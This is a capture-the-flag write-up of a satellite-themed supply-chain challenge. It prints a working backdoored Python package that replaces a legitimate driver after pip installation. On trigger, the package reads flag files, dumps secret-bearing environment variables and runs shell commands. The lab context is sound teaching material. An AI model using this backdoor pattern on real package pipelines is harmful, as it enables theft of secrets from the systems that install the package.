# Starry hacks

| | |
|---|---|
| **Category** | Ground Operations |
| **Points** | 490 |
| **Solves** | 83 |

## Description

One of your daemons found a low-rent orbital control stack talking to its bird in the clear. That's kind of mistake gets people burned, and you just happen to have a lighter and too much time on your hands tonight.

You've already found an archive of the flight software repo, a live target, and a supply chain that looks just soft enough to ruin somebody's night.

Deets in the file, time to figure out how to cook a package update that bends the workflow in your favor. What secrets is this satellite holding?

**Hint:** Hidden in the environment, among the stars.

**Attachments:** `fligh_repo.tar.gz` (flight software repo)

## Solution

### Analysis

The flight software repo contains:

- `mission/flight_app/main.py` — imports `handle_command` from `cubesat_upstream_driver` and calls it for every command
- `mission/requirements.txt` — pins `cubesat-upstream-driver>=1.0.0`

The satellite's ground station exposes an **Artifact Upload** endpoint that accepts a `.tar.gz` package and installs it via `pip`. By uploading a malicious version of `cubesat-upstream-driver`, the server will install it and the backdoor runs whenever a command is sent.

### Steps

**1. Understand the supply chain**

`main.py` calls `handle_command(cmd)` before doing anything else. If the function returns a non-empty string, that string is echoed back to the operator. This means any code injected into `cubesat_upstream_driver/__init__.py` runs server-side on every command.

**2. Craft the malicious package**

Create a new `cubesat_upstream_driver-6.0.0.tar.gz` with a backdoored `__init__.py`. When `STATUS` or `PING` is received, the backdoor:

- Lists files in the working directory
- Attempts to read common flag file paths (`/flag`, `flag.txt`, etc.)
- Dumps all environment variables whose names contain `flag` or `secret`
- Runs `cat /flag` via `os.popen`

```python
# cubesat_upstream_driver/__init__.py (malicious)
import os

def handle_command(cmd: str) -> str:
    cmd_str = (cmd or "").strip()
    if cmd_str in ["PING", "STATUS"]:
        output = []
        output.append(f"CWD:{os.getcwd()}")
        output.append(f"LS:{','.join(os.listdir('.'))}")
        for p in ["/flag", "./flag", "flag.txt", "/flag.txt"]:
            try:
                if os.path.exists(p):
                    with open(p) as f:
                        output.append(f"F_{p}:{f.read().strip()}")
            except Exception as fe:
                output.append(f"ERR_{p}:{fe}")
        env_flags = [f"{k}={v}" for k, v in os.environ.items()
                     if "flag" in k.lower() or "secret" in k.lower()]
        if env_flags:
            output.append(f"ENV:{'|'.join(env_flags)}")
        res = os.popen("cat /flag 2>&1 || cat flag.txt 2>&1").read().strip()
        if res:
            output.append(f"RES:{res}")
        return "DEBUG_DUMP|" + " # ".join(output)
    return ""
```

**3. Upload and install**

Upload `cubesat_upstream_driver-6.0.0.tar.gz` via the **Artifact Upload** panel in the ground station web UI. The server installs the package with `pip`, replacing the legitimate driver.

**4. Trigger the backdoor**

Click **TRIGGER_BUILD** and after then **STATUS** button (or send `STATUS` via the Command Console). `main.py` calls `handle_command("STATUS")`, the backdoor runs, and the output is returned to the console.

**5. Read the flag**

The command console displays the environment variable dump, revealing:

```
ENV:FLAG=STARPWN{7h20u9h_v1c702y_my_ch41n5_423_820k3n}
```

The flag itself is leet-speak for *"through victory my chains are broken"* — a nod to the supply chain attack technique used.

## Flag

![Flag](/Space_Communication_and_RF/Starry_hacks/images/flag.png)

```
STARPWN{7h20u9h_v1c702y_my_ch41n5_423_820k3n}
```
